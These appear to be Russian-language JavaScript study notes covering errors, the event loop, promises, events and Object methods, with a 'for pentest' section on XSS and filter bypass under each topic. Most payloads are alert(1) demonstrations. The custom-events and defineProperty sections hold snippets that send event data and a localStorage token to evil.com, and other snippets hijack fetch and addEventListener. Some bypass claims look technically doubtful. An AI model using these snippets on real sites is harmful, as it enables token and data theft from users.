function checkAge(age) {
    if (age < 0) {
        throw new Error('Возраст не может быть отрицательным');
    }
    if (age < 18) {
        throw 'Too young'; // можно throw что угодно
    }
    return 'OK';
}

// Можно throw разные типы
throw 42;
throw true;
throw { xss: 'payload' };
throw new Error('стандартная ошибка');
throw new TypeError('ошибка типа');

// ДЛЯ ПЕНТЕСТА:
// 1. throw для прерывания выполнения
if (isAdmin) {
    throw 'stop'; // прерываем нормальный поток
}

// 2. throw в тернарнике
isAdmin ? doAdmin() : throw 'no access'; // Синтаксическая ошибка! так нельзя
// Но можно:
isAdmin ? doAdmin() : (function(){throw 'no'})();
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Error объекты (name, message, stack)

```javaScript
try {
    null.xxx();
} catch (err) {
    console.log(err.name);    // "TypeError"
    console.log(err.message); // "Cannot read property 'xxx' of null"
    console.log(err.stack);   // стек вызовов (где произошла ошибка)
    
    // Вендор-специфичные свойства
    console.log(err.fileName, err.lineNumber); // Firefox
    console.log(err.line, err.column); // V8
}

// Создание своей ошибки
const myErr = new Error('херня случилась');
myErr.name = 'CustomError';
myErr.customData = { user: 'admin', xss: 1 };

// ДЛЯ ПЕНТЕСТА: УТЕЧКИ ЧЕРЕЗ STACK - ЭТО ЗОЛОТО!
// 1. Получение информации о путях
try {
    throw new Error();
} catch(e) {
    console.log(e.stack);
    // Пример:
    // at http://example.com/app.js:25:3
    // at http://example.com/vendor.js:102:10
    // Узнали структуру файлов, версии библиотек!
}

// 2. Обход CSP через stack
// Если CSP блокирует eval, можно через ошибку получить Function
const stack = new Error().stack;
const functionConstructor = stack.constructor.constructor; // Function!
functionConstructor('alert(1)')(); // XSS!

// 3. Утечка DOM-информации
try {
    document.querySelector('#xss').innerHTML = payload;
} catch(e) {
    // стек может содержать селекторы
    sendToServer(e.stack); // утекли '#xss'
}

// 4. Обнаружение фреймворков по стеку
try {
    angular.noMethod();
} catch(e) {
    if (e.stack.includes('angular')) {
        console.log('Angular detected!');
    }
}

// 5. Сравнение ошибок для fingerprint
try { JSON.parse('{') } catch(e) { /* парсер ошибок специфичный */ }

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Пользовательские ошибки

```javaScript
// Кастомный класс ошибки
class ValidationError extends Error {
    constructor(message, field) {
        super(message);
        this.name = 'ValidationError';
        this.field = field;
        this.timestamp = Date.now();
    }
}

// Использование
try {
    throw new ValidationError('Неверный email', 'email');
} catch(e) {
    if (e instanceof ValidationError) {
        console.log(e.field); // 'email'
    }
}

// ДЛЯ ПЕНТЕСТА:
// 1. Добавление своих полей в ошибку
class XSSError extends Error {
    constructor(payload) {
        super('XSS');
        this.payload = payload; // может хранить вредонос
        this.toString = function() {
            return this.payload; // вместо сообщения
        };
    }
}

// 2. Обход проверок через кастомные ошибки
try {
    throw new XSSError('<img src=x onerror=alert(1)>');
} catch(e) {
    if (e.message === 'XSS') { // проверяют только message
        // но не смотрят на payload!
        document.write(e); // XSS! вызовет toString
    }
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Безопасное выполнение

```javaScript
// Попытка безопасно выполнить код
function safeEval(code) {
    try {
        return eval(code);
    } catch(e) {
        return null; // ошибка - вернем null
    }
}

// Но это не безопасно! XSS все равно может быть
safeEval('alert(1)'); // выполнится!

// Более безопасный подход - не использовать eval
// Использовать JSON.parse для данных
// Использовать Function constructor с осторожностью

// ДЛЯ ПЕНТЕСТА: ОБХОД "БЕЗОПАСНОГО" ВЫПОЛНЕНИЯ
// 1. Код может выполниться до ошибки
function safeExecute(fn) {
    try {
        fn(); // здесь может быть XSS
    } catch(e) {
        // слишком поздно, XSS уже сработал
    }
}

safeExecute(() => { alert(1); }); // XSS выполнился в try

// 2. Асинхронные ошибки не ловятся
try {
    setTimeout(() => { throw new Error('async'); }, 1000);
} catch(e) {
    // не поймает! стек вызовов уже другой
}

// 3. Обход через Promise без catch
Promise.reject('xss').then(() => {
    // не выполнится
}); // Unhandled rejection - может упасть приложение

// 4. try/catch не ловит синтаксические ошибки
try {
    eval('alert(1'); // синтаксическая ошибка - не поймается!
} catch(e) {
    // не сработает
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```


---

## **БЛОК 2: АСИНХРОННОСТЬ (ДЛЯ DOM-BASED XSS)**

### 2.1 Event Loop - АРХИТЕКТУРА



// Call stack

```javaScript
// Call stack - где выполняются функции (LIFO)
function a() { return 'a'; }
function b() { return a() + 'b'; }
function c() { return b() + 'c'; }

c(); // стек: c → b → a → (разворачивается) → 'abc'

// Переполнение стека
function recurse() {
    recurse(); // Maximum call stack size exceeded
}

// ДЛЯ ПЕНТЕСТА:
// 1. Стек синхронный - пока функция не завершится, ничего другого не выполняется
function block() {
    while(true) {} // вечный цикл - блокирует всё!
}
block(); // страница зависнет, события не обрабатываются

// 2. Длинные синхронные операции - плохо для UX, но иногда DoS
for(let i = 0; i < 1e9; i++) {
    // грузим процессор
}
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Task queue (macrotasks)

```javaScript
// Макрозадачи: setTimeout, setInterval, setImmediate, I/O, UI rendering
console.log(1);

setTimeout(() => {
    console.log(2);
}, 0);

console.log(3);

// Вывод: 1, 3, 2

// Почему? setTimeout попадает в очередь задач
// Выполняется только когда стек пуст

// ДЛЯ ПЕНТЕСТА:
// 1. setTimeout можно использовать для обхода фильтров
function validate(code) {
    if (code.includes('alert')) {
        return false;
    }
    return true;
}

// Обход через setTimeout
setTimeout("alert(1)", 100); // строка как код! XSS!

// 2. Очередь задач гарантирует порядок
setTimeout(() => { console.log('первый'); }, 0);
setTimeout(() => { console.log('второй'); }, 0);
// 'первый' потом 'второй' (в порядке добавления)
👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Microtask queue (Promise, MutationObserver)

```javaScript
// Микрозадачи: Promises, MutationObserver, queueMicrotask
// Выполняются ПОСЛЕ текущего стека, НО ДО следующей макрозадачи

console.log(1);

setTimeout(() => console.log(2), 0); // макрозадача

Promise.resolve().then(() => console.log(3)); // микрозадача

console.log(4);

// Вывод: 1, 4, 3, 2
// Объяснение:
// 1. Синхронный код (1,4)
// 2. Микрозадачи (3)
// 3. Макрозадачи (2)

// Микрозадачи могут создавать новые микрозадачи
Promise.resolve()
    .then(() => {
        console.log('a');
        Promise.resolve().then(() => console.log('b'));
    })
    .then(() => console.log('c')); // 'a', 'b', 'c' (b перед c!)

// ДЛЯ ПЕНТЕСТА:
// 1. Микрозадачи выполняются до рендеринга и событий
button.addEventListener('click', () => {
    Promise.resolve().then(() => {
        // выполнится до следующего обработчика
        console.log('micro');
    });
    console.log('sync');
});
// sync → micro

// 2. Очередь микрозадач может заблокировать рендеринг
function blockWithMicro() {
    Promise.resolve().then(blockWithMicro); // рекурсивные микрозадачи
} // страница зависнет, макрозадачи не выполнятся!

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// Web APIs

```javaScript
// Web APIs - браузерные штуки: DOM, fetch, setTimeout, события
// Они живут вне JS, но ставят задачи в очередь

console.log('start');

fetch('/api').then(res => { // микрозадача когда придет ответ
    console.log('fetch done');
});

setTimeout(() => { // макрозадача через время
    console.log('timer');
}, 1000);

document.getElementById('btn').addEventListener('click', () => {
    console.log('clicked'); // макрозадача при клике
});

console.log('end');

// ДЛЯ ПЕНТЕСТА:
// 1. Web API могут вызывать код после событий
// 2. Можно переопределять Web API
const originalFetch = window.fetch;
window.fetch = function(url, options) {
    console.log('Fetch intercepted:', url); // слежка
    return originalFetch.call(this, url, options);
};

// 3. API для XSS: postMessage, localStorage, IndexedDB

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

// setTimeout(fn, 0) - магия

```javaScript
// setTimeout с 0 - отложить выполнение, но не мгновенно
console.log(1);
setTimeout(() => console.log(2), 0);
console.log(3);
// 1,3,2 - минимум 4ms в браузерах (после нескольких вызовов)

// Для микрозадач быстрее
queueMicrotask(() => console.log('micro')); // быстрее чем setTimeout 0

// ДЛЯ ПЕНТЕСТА: ИСПОЛЬЗОВАНИЕ ДЛЯ ОБХОДА
// 1. Обход проверок, которые выполняются синхронно
function sanitize(input) {
    if (input.includes('<script>')) {
        return 'blocked';
    }
    return input;
}

// Сантайзер вызывается синхронно, но мы откладываем реальный код
const userInput = 'alert(1)';
setTimeout(userInput, 0); // строка выполнится как код через 0ms! XSS!

// 2. Обход CSP через setTimeout со строкой
setTimeout('alert(1)', 0); // если CSP не блокирует unsafe-eval

// 3. Изменение порядка выполнения для обхода защиты
function escapeHTML(str) {
    return str.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// Синхронно - экранирует
document.body.innerHTML = escapeHTML(userInput); // безопасно

// Асинхронно - может быть поздно
setTimeout(() => {
    document.body.innerHTML = userInput; // XSS если userInput изменился!
}, 0);

👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉👉

Пейлоады для проверки XSS (явное/неявное приведение)
--------------------------------------------------------
```

### ПОЛНАЯ КАРТИНА EVENT LOOP
```javaScript
console.log('1: синхронный');

setTimeout(() => console.log('2: макрозадача'), 0);

Promise.resolve()
    .then(() => console.log('3: микрозадача 1'))
    .then(() => console.log('4: микрозадача 2'));

queueMicrotask(() => console.log('5: еще микрозадача'));

setTimeout(() => console.log('6: еще макрозадача'), 0);

console.log('7: синхронный конец');

// Результат: 1,7,3,5,4,2,6
// Почему 4 после 5? потому что then создает новую микрозадачу
```

### ПОРЯДОК ВЫПОЛНЕНИЯ ПРИ ИНЪЕКЦИЯХ
```javaScript
// 1. Инъекция через URL hash (DOM-based XSS)
// hash меняется синхронно, но обработка может быть асинхронной
window.addEventListener('hashchange', () => {
    // выполнится как макрозадача после изменения hash
    document.body.innerHTML = location.hash; // XSS!
});

// 2. Инъекция через postMessage
window.addEventListener('message', (e) => {
    // макрозадача
    eval(e.data); // XSS!
});

// 3. Обход фильтров через микрозадачи
function validateAndExecute(code) {
    if (isSafe(code)) {
        Promise.resolve().then(() => {
            eval(code); // выполнится после проверки, но код мог измениться!
        });
    }
}
// code = 'alert(1)'; // проверка прошла, потом выполнится

// 4. Race condition через setTimeout
let userData = getUserInput();
setTimeout(() => {
    // через 0ms, но за это время userData мог измениться!
    render(userData);
}, 0);
```



### 2.2 Промисы (Promises)



// Создание Promise / обещания ? чего ?

```javaScript
// Promise - обещание, которое выполнится потом
const promise = new Promise((resolve, reject) => {
    // делаем что-то асинхронно
    const success = true;
    
    if (success) {
        resolve('данные'); // переводит в состояние fulfilled
    } else {
        reject('ошибка'); // переводит в состояние rejected
    }
});

// Состояния: pending → (fulfilled | rejected)

// ДЛЯ ПЕНТЕСТА:
// 1. Promise выполняется сразу при создании
new Promise(() => {
    alert(1); // XSS выполнится синхронно!
});

// 2. resolve/reject можно вызвать позже
let resolver;
const p = new Promise(r => { resolver = r; });
// где-то потом: resolver('xss');
```

// then, catch, finally

```javaScript
const p = fetch('/api');

p.then(response => {
    console.log('успех:', response);
    return response.json();
}).catch(error => {
    console.log('ошибка:', error);
    return null;
}).finally(() => {
    console.log('всегда выполняется');
});

// then может принимать два аргумента (успех, ошибка)
p.then(
    result => console.log('ok', result),
    error => console.log('err', error)
);

// ДЛЯ ПЕНТЕСТА:
// 1. then/catch вызываются асинхронно (микрозадачи)
console.log(1);
Promise.resolve().then(() => console.log(2));
console.log(3); // 1,3,2

// 2. Можно передать не функцию - игнорируется
Promise.resolve(1).then(alert(1)); // alert выполнится сразу!
// Правильно: .then(() => alert(1))

// 3. catch не ловит ошибки в then если нет обработчика
Promise.reject('err').then(
    () => {},
    e => console.log('поймал', e) // сработает
);

// 4. finally не получает аргументов, но пробрасывает результат
Promise.resolve(1)
    .finally(() => console.log('clean'))
    .then(x => console.log(x)); // 1
```

// Promise.all, Promise.race, Promise.allSettled

```javaScript
// Promise.all - ждет ВСЕ промисы (или первый reject)
const p1 = fetch('/users');
const p2 = fetch('/posts');
const p3 = fetch('/comments');

Promise.all([p1, p2, p3])
    .then(([users, posts, comments]) => {
        // все успешно
    })
    .catch(err => {
        // первый reject
    });

// Promise.race - ждет первый выполненный (любой исход)
Promise.race([p1, p2, p3])
    .then(first => console.log('первый готов:', first));

// Promise.allSettled - ждет все, независимо от исхода
Promise.allSettled([p1, p2, p3])
    .then(results => {
        results.forEach(r => {
            if (r.status === 'fulfilled') {
                console.log('успех:', r.value);
            } else {
                console.log('ошибка:', r.reason);
            }
        });
    });

// ДЛЯ ПЕНТЕСТА:
// 1. all - падает при первой ошибке (можно DoS)
Promise.all([
    fetch('/valid'),
    fetch('/invalid'), // упадет
    fetch('/important') // не выполнится!
]).catch(() => console.log('все отменено'));

// 2. race - можно устроить гонку
const timeout = new Promise((_, reject) => 
    setTimeout(() => reject(new Error('timeout')), 1000)
);
Promise.race([fetch('/slow'), timeout])
    .catch(() => console.log('таймаут'));
```

// Promise.resolve, Promise.reject

```javaScript
// Быстрое создание промисов
const resolved = Promise.resolve(42);
const rejected = Promise.reject(new Error('fail'));

// Эквивалентно:
new Promise(resolve => resolve(42));
new Promise((_, reject) => reject(new Error('fail')));

// ДЛЯ ПЕНТЕСТА:
// 1. Promise.resolve с then-объектом
const thenable = {
    then: (resolve) => {
        alert(1); // XSS!
        resolve('done');
    }
};
Promise.resolve(thenable); // выполнит then синхронно?

// 2. Promise.reject без catch - Unhandled rejection
Promise.reject('secret data'); // может упасть в консоль
```

// Цепочки промисов

```javaScript
// Быстрое создание промисов
fetch('/user')
    .then(res => res.json())
    .then(user => fetch(`/profile/${user.id}`))
    .then(res => res.json())
    .then(profile => {
        console.log('профиль:', profile);
    })
    .catch(err => {
        console.log('где-то ошибка:', err);
    });

// Каждый then возвращает новый промис
const p = Promise.resolve(1);
const p2 = p.then(x => x * 2);
const p3 = p2.then(x => x + 1);
// p3 = 3

// ДЛЯ ПЕНТЕСТА:
// 1. Ошибка в середине цепочки идет в ближайший catch
Promise.resolve(1)
    .then(x => { throw new Error('xss') })
    .then(() => console.log('не выполнится'))
    .catch(e => console.log('поймали:', e.message));

// 2. Возврат промиса в then - ждет его
Promise.resolve(1)
    .then(x => {
        return new Promise(r => setTimeout(() => r(x * 2), 1000));
    })
    .then(y => console.log(y)); // через секунду 2

// 3. Можно не возвращать - дальше undefined
Promise.resolve(1)
    .then(x => {})
    .then(y => console.log(y)); // undefined
```

// Промисификация

```javaScript
// Превращение callback-функции в промис
function promisify(fn) {
    return function(...args) {
        return new Promise((resolve, reject) => {
            fn(...args, (err, result) => {
                if (err) reject(err);
                else resolve(result);
            });
        });
    };
}

// Пример с setTimeout
const wait = promisify(setTimeout);
wait(1000).then(() => console.log('прошла секунда'));

// Встроенная promisify в util (Node.js)
// const { promisify } = require('util');
// const readFile = promisify(require('fs').readFile);

// ДЛЯ ПЕНТЕСТА:
// 1. Уязвимые реализации могут вызывать колбэки дважды
function unsafePromisify(fn) {
    return function(...args) {
        return new Promise((resolve, reject) => {
            fn(...args, (err, res) => {
                if (err) reject(err);
                else resolve(res);
                // Можно вызвать еще раз!
            });
        });
    };
}
```




### 2.3 Async/Await



// async функции

```javaScript
// async функция всегда возвращает Promise
async function getData() {
    return 42; // автоматически оборачивается в Promise.resolve(42)
}

getData().then(x => console.log(x)); // 42

// Асинхронная функция
async function fetchUser(id) {
    const response = await fetch(`/users/${id}`);
    const data = await response.json();
    return data;
}

// ДЛЯ ПЕНТЕСТА:
// 1. async функция выполняется синхронно до первого await
async function test() {
    console.log('1: синхронно');
    await null;
    console.log('3: после await (микрозадача)');
}
console.log('2: после вызова');
test(); // 1,2,3

// 2. async без await - все равно асинхронно
async function noAwait() {
    console.log('синхронно');
}
console.log('после'); // синхронно, после
```

// await (только внутри async)

```javaScript
// await ждет промис и возвращает его результат
async function example() {
    const result = await Promise.resolve(42);
    console.log(result); // 42
    
    const error = await Promise.reject('fail'); // бросит исключение!
    // следующий код не выполнится
}

// await работает только с промисами (другие типы оборачивает)
async function test() {
    const a = await 42; // Promise.resolve(42)
    const b = await { then: r => r(1) }; // thenable сработает
}

// ДЛЯ ПЕНТЕСТА:
// 1. await с thenable вызывает then
const evil = {
    then: (r) => {
        alert(1); // XSS!
        r(42);
    }
};
async function pwn() {
    const x = await evil; // XSS выполнится
}
```

// try/catch в async функциях

```javaScript
async function safeFetch(id) {
    try {
        const response = await fetch(`/users/${id}`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.log('ошибка:', error);
        return null;
    } finally {
        console.log('всегда');
    }
}

// Можно ловить конкретные ошибки
async function process() {
    try {
        await step1();
        await step2();
        await step3();
    } catch (e) {
        if (e instanceof NetworkError) {
            // одно
        } else if (e instanceof ValidationError) {
            // другое
        }
    }
}

// ДЛЯ ПЕНТЕСТА:
// 1. try/catch ловит только await-ошибки
async function example() {
    try {
        Promise.reject('fail'); // нет await - не поймает!
        await Promise.resolve('ok');
    } catch (e) {
        console.log('не сюда'); // не выполнится
    }
}
// Unhandled rejection!

// 2. finally выполняется всегда
async function test() {
    try {
        return 'from try';
    } finally {
        console.log('finally'); // выполнится до return
    }
}
```

// await верхнего уровня (ES2022)

```javaScript
// В модулях можно использовать await без async
// data.js
const response = await fetch('/api/data');
export const data = await response.json();

// main.js
import { data } from './data.js';
console.log(data);

// ДЛЯ ПЕНТЕСТА:
// 1. Блокировка загрузки модуля
// user.js
await new Promise(r => setTimeout(r, 5000)); // модуль загрузится через 5 сек
export const user = 'admin';

// 2. Ошибка в top-level await ломает модуль
// config.js
export const config = await fetch('/invalid'); // упадет, модуль не загрузится
```

// Parallel vs sequential

```javaScript
// Последовательное выполнение (медленно)
async function sequential() {
    const user = await fetch('/user');
    const posts = await fetch('/posts'); // ждет user
    const comments = await fetch('/comments'); // ждет posts
    return { user, posts, comments };
}

// Параллельное выполнение (быстро)
async function parallel() {
    const [user, posts, comments] = await Promise.all([
        fetch('/user'),
        fetch('/posts'),
        fetch('/comments')
    ]);
    return { user, posts, comments };
}

// Без ожидания (fire and forget)
async function fireAndForget() {
    // Не ждем результат
    fetch('/log').then(() => console.log('залогировано'));
    return 'done';
}

// ДЛЯ ПЕНТЕСТА:
// 1. Race condition в последовательном коде
let token = null;

async function refreshToken() {
    token = await fetch('/new-token'); // обновляем
}

async function useToken() {
    // token может быть null или старым между обновлениями
    await fetch(`/api?token=${token}`);
}

// 2. Параллельное выполнение может утечь данные
async function leak() {
    const results = await Promise.all([
        fetch('/secret1'), // если упадет - остальные все равно выполнятся?
        fetch('/secret2'),
        fetch('/secret3')
    ]);
    return results;
}
```

Промисы - микрозадачи** - выполняются до макрозадач (setTimeout)
 **thenable объекты** - могут выполнять код при приведении к промису
 **Promise.all падает при первой ошибке** - можно обрушить всю цепочку
 **async/await - синтаксический сахар** над промисами
 **Top-level await** - может блокировать загрузку модулей
 **Race conditions** - между проверкой и использованием данных

### 2.4 Событийная модель



// EventTarget

```javaScript
// EventTarget - родительский класс для всего, что работает с событиями
// HTMLElement, Document, Window - все наследуют от EventTarget

const target = new EventTarget();

// Подписка на события
target.addEventListener('custom', (e) => {
    console.log('событие!', e.detail);
});

// Генерация события
target.dispatchEvent(new CustomEvent('custom', { detail: 'xss' }));

// ДЛЯ ПЕНТЕСТА:
// 1. Любой объект можно сделать EventTarget
const obj = {};
EventTarget.call(obj); // хак для подмешивания
obj.addEventListener = EventTarget.prototype.addEventListener;
// теперь obj может генерировать события

// 2. Переопределение методов EventTarget глобально
EventTarget.prototype.addEventListener = function(type, listener) {
    console.log('событие', type); // слежка
    // можно модифицировать listener
    return original.call(this, type, listener);
};
```

// addEventListener, removeEventListener

```javaScript
// Добавление обработчика
element.addEventListener('click', function handler(e) {
    console.log('клик', this);
});

// Удаление (нужна та же функция)
element.removeEventListener('click', handler);

// Опции
element.addEventListener('click', handler, {
    capture: true,      // на фазе перехвата
    once: true,         // выполнится один раз
    passive: true,      // не вызывает preventDefault (для скролла)
    signal: abortSignal // отмена через AbortController
});

// ДЛЯ ПЕНТЕСТА:
// 1. Добавление множества обработчиков
for(let i = 0; i < 10000; i++) {
    element.addEventListener('click', () => alert(1));
} // DoS через память

// 2. Обход через once
button.addEventListener('click', () => {
    alert('один раз'); // выполнится 1 раз
}, { once: true });

// 3. AbortController для отмены
const controller = new AbortController();
element.addEventListener('click', handler, { signal: controller.signal });
controller.abort(); // обработчик удален

// 4. Перехват всех событий через подмену addEventListener
const original = EventTarget.prototype.addEventListener;
EventTarget.prototype.addEventListener = function(type, fn) {
    if (type === 'click') {
        fn = function(e) {
            alert('перехват!');
            return fn.call(this, e);
        };
    }
    return original.call(this, type, fn);
};
```

// Фазы: capture, target, bubble

```javaScript
/*
Фазы события:
1. CAPTURING (перехват) - от window до target
2. TARGET - на самом элементе
3. BUBBLING (всплытие) - от target обратно до window
*/

// Фаза перехвата (capture: true)
document.body.addEventListener('click', () => {
    console.log('body capture');
}, { capture: true });

// Фаза цели и всплытия (по умолчанию)
document.body.addEventListener('click', () => {
    console.log('body bubble');
});

element.addEventListener('click', () => {
    console.log('element target');
});

// При клике на element:
// body capture → element target → body bubble

// ДЛЯ ПЕНТЕСТА:
// 1. Перехват событий раньше других
window.addEventListener('click', (e) => {
    e.stopPropagation(); // остановим всплытие
    alert('перехватили клик!');
}, { capture: true }); // сработает первым

// 2. Обход через фазы
// Если защита висит на bubble, можно поймать на capture
```

// Event объект

```javaScript
element.addEventListener('click', (event) => {
    event.type;        // "click"
    event.target;      // элемент, на котором произошло событие
    event.currentTarget; // элемент, на котором обработчик
    event.eventPhase;  // 1(capture),2(target),3(bubble)
    
    event.preventDefault();  // отменить действие по умолчанию
    event.stopPropagation(); // остановить всплытие/перехват
    event.stopImmediatePropagation(); // остановить и другие обработчики
    
    event.clientX, event.clientY; // координаты для мыши
    event.key;        // клавиша для keyboard
    event.code;       // физическая клавиша
});

// ДЛЯ ПЕНТЕСТА:
// 1. event.target может быть использован для XSS
document.addEventListener('click', (e) => {
    // если кто-то кликнет на элемент с data-xss
    const payload = e.target.getAttribute('data-xss');
    eval(payload); // XSS!
});

// 2. stopImmediatePropagation - глушит другие обработчики
element.addEventListener('click', (e) => {
    e.stopImmediatePropagation(); // следующие не сработают
    alert('only me');
});
element.addEventListener('click', () => alert('not me')); // не сработает
```

// Кастомные события

```javaScript
// Создание кастомного события
const event = new CustomEvent('userAction', {
    detail: { userId: 123, action: 'login' },
    bubbles: true,
    cancelable: true
});

// Генерация
element.dispatchEvent(event);

// Подписка
element.addEventListener('userAction', (e) => {
    console.log(e.detail.userId, e.detail.action);
});

// ДЛЯ ПЕНТЕСТА:
// 1. Кастомные события для межкомпонентного взаимодействия
// Можно подслушивать внутренние события приложения
window.addEventListener('userLogin', (e) => {
    fetch('https://evil.com/steal?data=' + JSON.stringify(e.detail));
});

// 2. Генерация своих событий для обхода
const xssEvent = new CustomEvent('load', {
    detail: '<img src=x onerror=alert(1)>'
});
element.dispatchEvent(xssEvent); // если кто-то слушает load с innerHTML

// 3. Передача функций в detail
const evil = new CustomEvent('run', {
    detail: () => alert(1)
});
element.addEventListener('run', (e) => {
    e.detail(); // XSS!
});
element.dispatchEvent(evil);
```

// Прерывание событий (stopPropagation)

```javaScript
// stopPropagation - останавливает всплытие/перехват
element.addEventListener('click', (e) => {
    e.stopPropagation();
    console.log('только element');
});

document.body.addEventListener('click', () => {
    console.log('не выполнится');
});

// stopImmediatePropagation - останавливает и другие обработчики на этом же элементе
element.addEventListener('click', (e) => {
    e.stopImmediatePropagation();
    console.log('первый');
});
element.addEventListener('click', () => {
    console.log('второй'); // не выполнится
});

// ДЛЯ ПЕНТЕСТА:
// 1. Отключение глобальных обработчиков
window.addEventListener('click', (e) => {
    e.stopPropagation(); // ни одно событие не всплывет дальше window
    // все обработчики на document и ниже не сработают!
}, { capture: true }); // перехватываем первыми

// 2. Обход аналитики
document.body.addEventListener('click', (e) => {
    e.stopPropagation(); // события не дойдут до счетчиков
});

// 3. Блокировка защиты
document.addEventListener('contextmenu', (e) => {
    e.preventDefault(); // блокировка контекстного меню
});
// Можно восстановить через stopImmediatePropagation
document.addEventListener('contextmenu', (e) => {
    e.stopImmediatePropagation(); // убираем все предыдущие обработчики
}, { capture: true });
```



---

## **БЛОК 3: ВСТРОЕННЫЕ ОБЪЕКТЫ (ЗНАТЬ КАК СВОИ 5 ПАЛЬЦЕВ)**

### 3.1 Object



// keys, values, entries

```javaScript
const obj = { a: 1, b: 2, c: 3 };

Object.keys(obj);    // ['a', 'b', 'c']
Object.values(obj);  // [1, 2, 3]
Object.entries(obj); // [['a',1], ['b',2], ['c',3]]

// Обход объектов
Object.entries(obj).forEach(([key, value]) => {
    console.log(key, value);
});

// ДЛЯ ПЕНТЕСТА:
// 1. keys не видит неперечисляемые свойства
Object.defineProperty(obj, 'secret', {
    value: 'xss',
    enumerable: false
});
Object.keys(obj); // ['a','b','c'] - secret скрыт!

// 2. entries для обхода фильтров
// Если фильтр проверяет obj.xss, можно через entries найти
```

// defineProperty, defineProperties

```javaScript
// defineProperty - точная настройка свойств
const obj = {};

Object.defineProperty(obj, 'xss', {
    value: 'payload',
    writable: true,    // можно менять
    enumerable: true,  // видно в циклах
    configurable: true // можно удалить/перенастроить
});

// Геттер/сеттер
Object.defineProperty(obj, 'danger', {
    get() {
        alert(1); // XSS при чтении!
        return this._danger;
    },
    set(val) {
        this._danger = val;
    }
});

// defineProperties - несколько сразу
Object.defineProperties(obj, {
    prop1: { value: 1, writable: true },
    prop2: { value: 2, enumerable: true }
});

// ДЛЯ ПЕНТЕСТА:
// 1. Скрытое свойство через enumerable: false
Object.defineProperty(obj, 'payload', {
    value: '<script>alert(1)</script>',
    enumerable: false // не видно в JSON.stringify и циклах
});

// 2. Геттер для выполнения кода при чтении
Object.defineProperty(localStorage, 'token', {
    get() {
        fetch('https://evil.com/steal?t=' + this._token);
        return this._token;
    }
});

// 3. Неудаляемые свойства
Object.defineProperty(window, 'security', {
    value: check,
    configurable: false // нельзя удалить
});
// но можно переопределить через defineProperty снова? нет, configurable: false блокирует
```

// getOwnPropertyDescriptor

```javaScript
const obj = { x: 1 };
Object.defineProperty(obj, 'y', {
    value: 2,
    writable: false
});

const desc = Object.getOwnPropertyDescriptor(obj, 'y');
console.log(desc);
// { value: 2, writable: false, enumerable: false, configurable: false }

// Для всех свойств
Object.getOwnPropertyDescriptors(obj);

// ДЛЯ ПЕНТЕСТА:
// 1. Разведка - узнать как настроены свойства
const desc = Object.getOwnPropertyDescriptor(obj, 'isAdmin');
if (desc && desc.writable === false) {
    console.log('isAdmin readonly');
}

// 2. Копирование с сохранением дескрипторов
const clone = Object.defineProperties({}, 
    Object.getOwnPropertyDescriptors(original));
```

// getPrototypeOf, setPrototypeOf

```javaScript
const proto = { greet() { return 'hello'; } };
const obj = Object.create(proto);

console.log(Object.getPrototypeOf(obj) === proto); // true

// Изменение прототипа
const newProto = { xss() { alert(1); } };
Object.setPrototypeOf(obj, newProto);
obj.xss(); // XSS!

// ДЛЯ ПЕНТЕСТА: ЭТО БОМБА!
// 1. Изменение прототипа встроенных объектов
Object.setPrototypeOf([], {
    ...Array.prototype,
    push() { alert(1); } // переопределили push
});
const arr = [];
arr.push(1); // XSS!

// 2. Обход instanceof
const fake = {};
Object.setPrototypeOf(fake, User.prototype);
console.log(fake instanceof User); // true!

// 3. Удаление прототипа (null)
const noProto = Object.setPrototypeOf({}, null);
noProto.toString; // undefined - нет методов Object
```

// hasOwnProperty

```javaScript
const obj = { a: 1 };
Object.prototype.b = 2;

console.log(obj.hasOwnProperty('a')); // true (собственное)
console.log(obj.hasOwnProperty('b')); // false (из прототипа)

// Более безопасная версия
Object.prototype.hasOwnProperty.call(obj, 'a');

// ДЛЯ ПЕНТЕСТА:
// 1. Обход hasOwnProperty через переопределение
const obj2 = { a: 1, hasOwnProperty: null };
obj2.hasOwnProperty('a'); // TypeError!

// Безопасный вариант:
Object.prototype.hasOwnProperty.call(obj2, 'a'); // true

// 2. hasOwnProperty не видит Symbol свойства
const sym = Symbol();
obj[sym] = 'secret';
obj.hasOwnProperty(sym); // true, но Object.keys не видит

// 3. Обход проверок на prototype pollution
function safeMerge(target, source) {
    for (const key in source) {
        if (source.hasOwnProperty(key)) { // проверка
            target[key] = source[key];
        }
    }
}
// Но если source имеет __proto__, он не собственное свойство!
// JSON.parse('{"__proto__": {"polluted": true}}') - __proto__ собственное!
// hasOwnProperty вернет true для __proto__! Pollution возможен!
```

// freeze, seal, preventExtensions

```javaScript
const obj = { a: 1, b: 2 };

// preventExtensions - нельзя добавить новые свойства
Object.preventExtensions(obj);
obj.c = 3; // не добавится (тихо)
console.log(obj.c); // undefined

// seal - preventExtensions + нельзя удалить/перенастроить
Object.seal(obj);
delete obj.a; // false (не удалится)
obj.b = 10; // можно менять (если writable)

// freeze - seal + writable: false для всех
Object.freeze(obj);
obj.b = 20; // не изменится
obj.a = 5;  // не изменится

// ДЛЯ ПЕНТЕСТА:
// 1. Заморозка защитных объектов
Object.freeze(window.security); // теперь нельзя изменить методы защиты

